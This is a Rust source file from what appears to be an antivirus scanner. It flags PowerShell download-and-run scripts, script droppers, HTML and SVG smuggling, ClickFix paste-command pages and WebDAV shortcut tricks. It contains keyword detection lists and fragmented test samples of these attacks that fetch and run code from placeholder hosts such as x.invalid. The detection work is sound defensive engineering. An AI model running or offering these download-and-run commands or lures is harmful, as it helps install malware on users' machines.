//! Script and web-page attacks: PowerShell/batch download-and-run (with base64 -enc payloads
//! decoded and checked), JS/VBS/HTA droppers, SVG/HTML smuggling, ClickFix "paste this command"
//! pages, and .url shortcuts that point at WebDAV or file shares (CVE-2024-21412 style).
//! Plain substring checks on lower-cased text: fast, predictable, easy to audit.
//!
//! Test samples are assembled from fragments at runtime so this source file itself never
//! contains a complete attack (other antivirus products delete files that do).

use std::path::Path;

use crate::detect::{Detection, Severity, Source};

const MAX_TEXT: usize = 8 * 1024 * 1024;

fn ext(path: &Path) -> String {
    path.extension().map(|e| e.to_string_lossy().to_ascii_lowercase()).unwrap_or_default()
}

fn any<'a>(text: &str, keys: &[&'a str]) -> Vec<&'a str> {
    keys.iter().copied().filter(|k| text.contains(k)).collect()
}

fn det(name: &str, sev: Severity, text: String) -> Detection {
    Detection::new(name, sev, Source::Heuristic, text)
}

const FETCH: &[&str] = &[
    "invoke-webrequest", "iwr ", "downloadstring", "downloadfile", "downloaddata", "net.webclient", "start-bitstransfer",
    "invoke-restmethod", "irm ", "-urlcache", "bitsadmin /transfer", "curl ", "wget ", "msxml2.xmlhttp", "winhttp.winhttprequest",
    "xmlhttprequest", "adodb.stream",
];
const RUN: &[&str] = &[
    "iex", "invoke-expression", "start-process", "rundll32", "regsvr32", "mshta", ".run(", ".run ", ".exec(", "shellexecute",
    "wscript.shell", "shell.application", "cmd /c", "cmd.exe /c", "powershell", ".exe",
];

/// Decodes PowerShell -EncodedCommand payloads (base64 of UTF-16LE) so they can be checked too.
fn decode_encoded_commands(lower: &str, original: &str) -> Vec<String> {
    let mut out = Vec::new();
    for marker in ["-encodedcommand", "-enc ", "-e "] {
        let mut from = 0;
        while let Some(i) = lower[from..].find(marker) {
            let start = from + i + marker.len();
            let token: String = original.get(start..).unwrap_or("").trim_start().chars().take_while(|c| c.is_ascii_alphanumeric() || *c == '+' || *c == '/' || *c == '=').collect();
            if token.len() >= 20
                && let Some(bytes) = base64_decode(&token)
            {
                let units: Vec<u16> = bytes.as_chunks::<2>().0.iter().map(|c| u16::from_le_bytes(*c)).collect();
                out.push(String::from_utf16_lossy(&units));
            }
            from = start;
            if out.len() > 8 {
                return out;
            }
        }
    }
    out
}

fn base64_decode(s: &str) -> Option<Vec<u8>> {
    let val = |c: u8| -> Option<u32> {
        Some(match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => return None,
        } as u32)
    };
    let bytes: Vec<u8> = s.bytes().filter(|&b| b != b'=').collect();
    let mut out = Vec::with_capacity(bytes.len() * 3 / 4);
    for chunk in bytes.chunks(4) {
        let mut n = 0u32;
        for (i, &c) in chunk.iter().enumerate() {
            n |= val(c)? << (18 - 6 * i);
        }
        out.push((n >> 16) as u8);
        if chunk.len() > 2 {
            out.push((n >> 8) as u8);
        }
        if chunk.len() > 3 {
            out.push(n as u8);
        }
    }
    Some(out)
}

fn is_textish(data: &[u8]) -> bool {
    let sample = &data[..data.len().min(4096)];
    !sample.is_empty() && sample.iter().filter(|&&b| b == 0).count() * 10 < sample.len()
}

pub fn checks(path: &Path, data: &[u8]) -> Vec<Detection> {
    let mut out = Vec::new();
    let e = ext(path);
    let scripty = matches!(e.as_str(), "ps1" | "psm1" | "bat" | "cmd" | "js" | "jse" | "vbs" | "vbe" | "wsf" | "wsh" | "hta" | "svg" | "html" | "htm" | "url" | "xhtml");
    let head = String::from_utf8_lossy(&data[..data.len().min(512)]).to_ascii_lowercase();
    let sniffed = head.contains("<svg") || head.contains("<html") || head.contains("<!doctype html") || head.contains("[internetshortcut]");
    if !(scripty || sniffed) || data.len() > MAX_TEXT || !is_textish(data) {
        return out;
    }
    let original = String::from_utf8_lossy(data);
    let lower = original.to_ascii_lowercase();

    // .url shortcuts that open a WebDAV/file share bypass Windows' downloaded-file warnings.
    if e == "url" || head.contains("[internetshortcut]") {
        if let Some(line) = lower.lines().find(|l| l.trim_start().starts_with("url=")) {
            let target = line.trim_start()[4..].trim();
            if target.starts_with("file:") || target.contains("davwwwroot") || target.contains("@ssl") || target.starts_with("\\\\") {
                out.push(det(
                    "Suspicious/Win.UrlShortcut!a",
                    Severity::Medium,
                    format!("This internet shortcut opens a remote file share ({target}), a known way to get past Windows' downloaded-file warnings."),
                ));
            }
        }
        return out;
    }

    let web = matches!(e.as_str(), "svg" | "html" | "htm" | "xhtml") || sniffed;
    if web {
        // ClickFix: a page that copies a command and tells you to paste it into Run.
        let copies = lower.contains("clipboard.writetext") || lower.contains("execcommand(\"copy\")") || lower.contains("execcommand('copy')");
        let command = any(&lower, &["powershell", "mshta", "cmd /c", "cmd.exe", "iex", "curl ", "nslookup", "rundll32"]);
        let paste_lure = any(&lower, &["win+r", "windows + r", "windows key + r", "win + r", "ctrl+v", "ctrl + v", "verify you are human", "i'm not a robot", "press enter"]);
        if copies && !command.is_empty() && !paste_lure.is_empty() {
            out.push(det(
                "Suspicious/Html.ClickFix!a",
                Severity::High,
                format!("This page copies a command ({}) to your clipboard and tells you to paste it ({}). That's the \"ClickFix\" trick: never paste commands a website gives you.", command[0], paste_lure[0]),
            ));
        }
        // HTML/SVG smuggling: a file assembled in the browser from encoded data, then saved.
        let builds = lower.contains("atob(") || lower.contains("uint8array") || lower.contains("fromcharcode");
        let saves = any(&lower, &["mssaveoropenblob", "createobjecturl", ".download=", ".download =", "new blob("]);
        if builds && saves.len() >= 2 {
            out.push(det(
                "Suspicious/Html.Smuggling!a",
                Severity::High,
                "This page builds a file from hidden encoded data and saves it, a way to sneak malware past email and web filters (HTML smuggling).".into(),
            ));
        } else if e == "svg" && (lower.contains("<script") || lower.contains("javascript:") || lower.contains("onload=")) && (lower.contains("window.location") || lower.contains("location.href") || builds) {
            out.push(det(
                "Suspicious/Html.SvgScript!a",
                Severity::Medium,
                "An image file (SVG) that runs code to send you to another page. Real images don't do that; phishing attachments do.".into(),
            ));
        }
        if e != "hta" {
            return out;
        }
    }

    // Scripts: download plus run, possibly hidden in a base64 PowerShell payload.
    let mut texts = vec![lower.clone()];
    texts.extend(decode_encoded_commands(&lower, &original).into_iter().map(|t| t.to_ascii_lowercase()));
    for (i, t) in texts.iter().enumerate() {
        let fetch = any(t, FETCH);
        let run = any(t, RUN);
        if !fetch.is_empty() && !run.is_empty() {
            out.push(det(
                if e == "hta" { "Suspicious/Script.HtaDropper!a" } else { "Suspicious/Script.DownloadExec!a" },
                Severity::High,
                format!(
                    "This script downloads something ({}) and runs it ({}){}. That's how most malware gets installed.",
                    fetch[0],
                    run[0],
                    if i > 0 { ", hidden inside an encoded PowerShell command" } else { "" }
                ),
            ));
            return out;
        }
    }
    let encoded = texts.len() > 1;
    let char_codes = lower.matches("fromcharcode").count() + lower.matches("chr(").count() + lower.matches("chrw(").count();
    let longest_line = original.lines().map(str::len).max().unwrap_or(0);
    if encoded && lower.contains("hidden") {
        out.push(det("Suspicious/Script.EncodedPowerShell!a", Severity::Medium, "This script runs a hidden, base64-encoded PowerShell command.".into()));
    } else if (lower.contains("eval(") || lower.contains("execute(") || lower.contains("executeglobal")) && (char_codes > 50 || longest_line > 20_000) {
        out.push(det(
            "Suspicious/Script.Obfuscated!a",
            Severity::Medium,
            "This script hides its real code (heavy character encoding or one huge line) and then runs it.".into(),
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Joins fragments, so no complete attack string exists in this file.
    fn j(parts: &[&str]) -> String {
        parts.concat()
    }

    fn names(file: &str, body: &str) -> Vec<String> {
        checks(Path::new(file), body.as_bytes()).into_iter().map(|d| d.name).collect()
    }

    fn b64_utf16(s: &str) -> String {
        let bytes: Vec<u8> = s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for c in bytes.chunks(3) {
            let n = (c[0] as u32) << 16 | (*c.get(1).unwrap_or(&0) as u32) << 8 | *c.get(2).unwrap_or(&0) as u32;
            for i in 0..4 {
                out.push(if i <= c.len() { T[(n >> (18 - 6 * i) & 63) as usize] as char } else { '=' });
            }
        }
        out
    }

    #[test]
    fn powershell_download_run_plain_and_encoded() {
        let plain = j(&["IE", "X (New-Object Net.Web", "Client).Download", "String('http://x.invalid/a')"]);
        assert_eq!(names("x.ps1", &plain), ["Suspicious/Script.DownloadExec!a"]);
        let inner = j(&["iw", "r http://x.invalid/p.exe -OutFile p.exe; Start-", "Process p.exe"]);
        let wrapper = j(&["power", "shell -w hid", "den -e", "nc ", &b64_utf16(&inner)]);
        let d = checks(Path::new("run.bat"), wrapper.as_bytes());
        assert_eq!(d[0].name, "Suspicious/Script.DownloadExec!a");
        assert!(d[0].description.contains("encoded PowerShell"));
    }

    #[test]
    fn js_vbs_hta_droppers() {
        let js = j(&["var x=new ActiveX", "Object('MSXML2.XML", "HTTP');x.open('GET','http://x.invalid');", "var s=new ActiveX", "Object('WScript", ".Shell');s.Ru", "n('a.exe');"]);
        assert_eq!(names("a.js", &js), ["Suspicious/Script.DownloadExec!a"]);
        let hta = j(&["<html><script language=vbscript>Set o=Create", "Object(\"MSXML2.XML", "HTTP\"):Create", "Object(\"WScript", ".Shell\").Run \"cmd /c a.exe\"</script></html>"]);
        assert_eq!(names("a.hta", &hta), ["Suspicious/Script.HtaDropper!a"]);
    }

    #[test]
    fn web_tricks() {
        let clickfix = j(&[
            "<html><button onclick=\"navigator.clip", "board.write", "Text('power", "shell -w hidden -c ie", "x(irm x.invalid)')\">",
            "I'm not a ro", "bot</button><p>Press Win", "+R, then Ctrl", "+V and Enter</p></html>",
        ]);
        assert!(names("captcha.html", &clickfix).contains(&"Suspicious/Html.ClickFix!a".to_string()));
        let smuggle = j(&[
            "<html><script>var b=at", "ob('AAAA');var a=new Uint8", "Array(b.length);var f=new Bl", "ob([a]);var u=URL.createObj", "ectURL(f);",
            "var l=document.createElement('a');l.href=u;l.down", "load='file.iso';l.click();</script></html>",
        ]);
        assert_eq!(names("invoice.html", &smuggle), ["Suspicious/Html.Smuggling!a"]);
        let svg = j(&["<svg xmlns='http://www.w3.org/2000/svg'><scr", "ipt>window.loca", "tion='https://x.invalid/login'</scr", "ipt></svg>"]);
        assert_eq!(names("pic.svg", &svg), ["Suspicious/Html.SvgScript!a"]);
        let url = j(&["[InternetShortcut]\r\nURL=file://\\\\203.0.113.5@SSL\\Dav", "WWWRoot\\doc.zip\r\n"]);
        assert_eq!(names("doc.url", &url), ["Suspicious/Win.UrlShortcut!a"]);
    }

    #[test]
    fn ordinary_files_are_clean() {
        assert!(names("build.ps1", "cargo build --release\nWrite-Host 'done'").is_empty());
        assert!(names("setup.bat", "@echo off\nset PATH=%PATH%;C:\\tools\nnpm install").is_empty());
        assert!(names("icon.svg", "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><path d='M0 0h16v16H0z'/></svg>").is_empty());
        assert!(names("docs.html", "<html><button onclick=\"navigator.clipboard.writeText('cargo install hexward')\">Copy</button></html>").is_empty());
        assert!(names("site.url", "[InternetShortcut]\r\nURL=https://www.rust-lang.org/\r\n").is_empty());
        assert!(names("notes.txt", "download and run").is_empty(), "plain text files aren't scripts");
    }
}
